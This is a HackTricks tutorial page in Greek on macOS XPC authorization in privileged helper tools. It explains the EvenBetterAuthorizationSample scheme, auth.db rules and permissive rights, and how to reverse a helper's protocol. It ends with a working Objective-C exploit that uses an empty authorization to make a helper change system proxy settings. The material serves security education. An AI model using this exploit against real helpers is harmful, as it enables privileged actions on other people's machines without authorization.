# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Η Apple προτείνει επίσης έναν άλλο τρόπο για να πιστοποιήσει αν η διαδικασία που συνδέεται έχει **δικαιώματα να καλέσει μια εκτεθειμένη μέθοδο XPC**.

Όταν μια εφαρμογή χρειάζεται να **εκτελέσει ενέργειες ως προνομιούχος χρήστης**, αντί να εκτελεί την εφαρμογή ως προνομιούχος χρήστης, συνήθως εγκαθιστά ως root ένα HelperTool ως υπηρεσία XPC που μπορεί να καλείται από την εφαρμογή για να εκτελέσει αυτές τις ενέργειες. Ωστόσο, η εφαρμογή που καλεί την υπηρεσία θα πρέπει να έχει αρκετή εξουσιοδότηση.

### ShouldAcceptNewConnection πάντα ΝΑΙ

Ένα παράδειγμα μπορεί να βρεθεί στο [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Στο `App/AppDelegate.m` προσπαθεί να **συνδεθεί** με το **HelperTool**. Και στο `HelperTool/HelperTool.m` η συνάρτηση **`shouldAcceptNewConnection`** **δεν θα ελέγξει** καμία από τις απαιτήσεις που αναφέρθηκαν προηγουμένως. Θα επιστρέφει πάντα ΝΑΙ:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Για περισσότερες πληροφορίες σχετικά με το πώς να ρυθμίσετε σωστά αυτήν την επιθεώρηση:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Δικαιώματα εφαρμογής

Ωστόσο, υπάρχει κάποια **εξουσιοδότηση που συμβαίνει όταν καλείται μια μέθοδος από το HelperTool**.

Η συνάρτηση **`applicationDidFinishLaunching`** από το `App/AppDelegate.m` θα δημιουργήσει μια κενή αναφορά εξουσιοδότησης μετά την εκκίνηση της εφαρμογής. Αυτό θα πρέπει πάντα να λειτουργεί.\
Στη συνέχεια, θα προσπαθήσει να **προσθέσει κάποια δικαιώματα** σε αυτήν την αναφορά εξουσιοδότησης καλώντας το `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Η συνάρτηση `setupAuthorizationRights` από το `Common/Common.m` θα αποθηκεύσει στη βάση δεδομένων auth `/var/db/auth.db` τα δικαιώματα της εφαρμογής. Σημειώστε πώς θα προσθέσει μόνο τα δικαιώματα που δεν είναι ακόμη στη βάση δεδομένων:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Η συνάρτηση `enumerateRightsUsingBlock` είναι αυτή που χρησιμοποιείται για να αποκτήσει τις άδειες των εφαρμογών, οι οποίες ορίζονται στο `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Αυτό σημαίνει ότι στο τέλος αυτής της διαδικασίας, οι άδειες που δηλώνονται μέσα στο `commandInfo` θα αποθηκευτούν στο `/var/db/auth.db`. Σημειώστε πώς μπορείτε να βρείτε για **κάθε μέθοδο** που θα απαιτεί **αυθεντικοποίηση**, **όνομα άδειας** και το **`kCommandKeyAuthRightDefault`**. Το τελευταίο **υποδεικνύει ποιος μπορεί να αποκτήσει αυτό το δικαίωμα**.

Υπάρχουν διαφορετικοί τομείς για να υποδείξουν ποιος μπορεί να έχει πρόσβαση σε ένα δικαίωμα. Ορισμένοι από αυτούς ορίζονται στο [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (μπορείτε να βρείτε [όλους εδώ](https://www.dssw.co.uk/reference/authorization-rights/)), αλλά ως σύνοψη:

<table><thead><tr><th width="284.3333333333333">Όνομα</th><th width="165">Τιμή</th><th>Περιγραφή</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Οποιοσδήποτε</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Κανείς</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Ο τρέχων χρήστης πρέπει να είναι διαχειριστής (μέσα στην ομάδα διαχειριστών)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ρωτήστε τον χρήστη να αυθεντικοποιηθεί.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ρωτήστε τον χρήστη να αυθεντικοποιηθεί. Πρέπει να είναι διαχειριστής (μέσα στην ομάδα διαχειριστών)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Καθορίστε κανόνες</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Καθορίστε μερικά επιπλέον σχόλια σχετικά με το δικαίωμα</td></tr></tbody></table>

### Επαλήθευση Δικαιωμάτων

Στο `HelperTool/HelperTool.m`, η συνάρτηση **`readLicenseKeyAuthorization`** ελέγχει αν ο καλών είναι εξουσιοδοτημένος να **εκτελέσει αυτή τη μέθοδο** καλώντας τη συνάρτηση **`checkAuthorization`**. Αυτή η συνάρτηση θα ελέγξει αν τα **authData** που αποστέλλονται από τη διαδικασία κλήσης έχουν **σωστή μορφή** και στη συνέχεια θα ελέγξει **τι απαιτείται για να αποκτήσει το δικαίωμα** να καλέσει τη συγκεκριμένη μέθοδο. Αν όλα πάνε καλά, το **επιστρεφόμενο `error` θα είναι `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Σημειώστε ότι για να **ελέγξετε τις απαιτήσεις για να αποκτήσετε το δικαίωμα** να καλέσετε αυτή τη μέθοδο, η συνάρτηση `authorizationRightForCommand` θα ελέγξει απλώς το προηγουμένως σχολιασμένο αντικείμενο **`commandInfo`**. Στη συνέχεια, θα καλέσει **`AuthorizationCopyRights`** για να ελέγξει **αν έχει τα δικαιώματα** να καλέσει τη συνάρτηση (σημειώστε ότι οι σημαίες επιτρέπουν την αλληλεπίδραση με τον χρήστη).

Σε αυτή την περίπτωση, για να καλέσετε τη συνάρτηση `readLicenseKeyAuthorization`, το `kCommandKeyAuthRightDefault` ορίζεται σε `@kAuthorizationRuleClassAllow`. Έτσι, **ο καθένας μπορεί να το καλέσει**.

### Πληροφορίες DB

Αναφέρθηκε ότι αυτές οι πληροφορίες αποθηκεύονται στο `/var/db/auth.db`. Μπορείτε να καταγράψετε όλους τους αποθηκευμένους κανόνες με:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Μπορείτε να διαβάσετε ποιος μπορεί να έχει πρόσβαση στο δικαίωμα με:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Επιτρεπτικά δικαιώματα

Μπορείτε να βρείτε **όλες τις ρυθμίσεις αδειών** [**εδώ**](https://www.dssw.co.uk/reference/authorization-rights/), αλλά οι συνδυασμοί που δεν θα απαιτούν αλληλεπίδραση από τον χρήστη θα είναι:

1. **'authenticate-user': 'false'**
- Αυτό είναι το πιο άμεσο κλειδί. Αν οριστεί σε `false`, καθορίζει ότι ένας χρήστης δεν χρειάζεται να παρέχει πιστοποίηση για να αποκτήσει αυτό το δικαίωμα.
- Χρησιμοποιείται σε **συνδυασμό με ένα από τα 2 παρακάτω ή υποδεικνύοντας μια ομάδα** στην οποία πρέπει να ανήκει ο χρήστης.
2. **'allow-root': 'true'**
- Αν ένας χρήστης λειτουργεί ως ο χρήστης root (ο οποίος έχει ανυψωμένα δικαιώματα), και αυτό το κλειδί είναι ορισμένο σε `true`, ο χρήστης root θα μπορούσε ενδεχομένως να αποκτήσει αυτό το δικαίωμα χωρίς περαιτέρω πιστοποίηση. Ωστόσο, συνήθως, η απόκτηση καθεστώτος χρήστη root απαιτεί ήδη πιστοποίηση, οπότε αυτό δεν είναι ένα σενάριο "χωρίς πιστοποίηση" για τους περισσότερους χρήστες.
3. **'session-owner': 'true'**
- Αν οριστεί σε `true`, ο κάτοχος της συνεδρίας (ο τρέχων συνδεδεμένος χρήστης) θα αποκτήσει αυτό το δικαίωμα αυτόματα. Αυτό μπορεί να παρακάμψει πρόσθετη πιστοποίηση αν ο χρήστης είναι ήδη συνδεδεμένος.
4. **'shared': 'true'**
- Αυτό το κλειδί δεν παρέχει δικαιώματα χωρίς πιστοποίηση. Αντίθετα, αν οριστεί σε `true`, σημαίνει ότι μόλις το δικαίωμα έχει πιστοποιηθεί, μπορεί να μοιραστεί μεταξύ πολλών διαδικασιών χωρίς να χρειάζεται η κάθε μία να επαναπιστοποιηθεί. Αλλά η αρχική χορήγηση του δικαιώματος θα απαιτεί ακόμα πιστοποίηση εκτός αν συνδυαστεί με άλλα κλειδιά όπως το `'authenticate-user': 'false'`.

Μπορείτε να [**χρησιμοποιήσετε αυτό το σενάριο**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) για να αποκτήσετε τα ενδιαφέροντα δικαιώματα:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Αντιστροφή Εξουσιοδότησης

### Έλεγχος αν χρησιμοποιείται το EvenBetterAuthorization

Αν βρείτε τη συνάρτηση: **`[HelperTool checkAuthorization:command:]`** είναι πιθανό ότι η διαδικασία χρησιμοποιεί το προηγουμένως αναφερόμενο σχήμα για εξουσιοδότηση:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Αυτό, αν αυτή η συνάρτηση καλεί συναρτήσεις όπως `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, χρησιμοποιεί το [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Ελέγξτε το **`/var/db/auth.db`** για να δείτε αν είναι δυνατό να αποκτήσετε άδειες για να καλέσετε κάποια προνομιακή ενέργεια χωρίς αλληλεπίδραση χρήστη.

### Πρωτόκολλο Επικοινωνίας

Στη συνέχεια, πρέπει να βρείτε το σχήμα πρωτοκόλλου προκειμένου να μπορέσετε να καθιερώσετε επικοινωνία με την υπηρεσία XPC.

Η συνάρτηση **`shouldAcceptNewConnection`** υποδεικνύει το πρωτόκολλο που εξάγεται:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Σε αυτή την περίπτωση, έχουμε το ίδιο όπως στο EvenBetterAuthorizationSample, [**ελέγξτε αυτή τη γραμμή**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Γνωρίζοντας το όνομα του χρησιμοποιούμενου πρωτοκόλλου, είναι δυνατό να **εκφορτώσετε τον ορισμό της κεφαλίδας του** με:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Τέλος, πρέπει απλώς να γνωρίζουμε το **όνομα της εκτεθειμένης Υπηρεσίας Mach** προκειμένου να καθορίσουμε μια επικοινωνία μαζί της. Υπάρχουν αρκετοί τρόποι για να το βρούμε αυτό:

- Στο **`[HelperTool init]`** όπου μπορείτε να δείτε την Υπηρεσία Mach που χρησιμοποιείται:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Στο plist του launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Παράδειγμα Εκμετάλλευσης

Σε αυτό το παράδειγμα δημιουργούνται:

- Ο ορισμός του πρωτοκόλλου με τις λειτουργίες
- Μια κενή αυθεντοποίηση για να ζητήσει πρόσβαση
- Μια σύνδεση στην υπηρεσία XPC
- Μια κλήση στη λειτουργία αν η σύνδεση ήταν επιτυχής
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Άλλοι βοηθοί προνομίων XPC που καταχρώνται

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Αναφορές

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
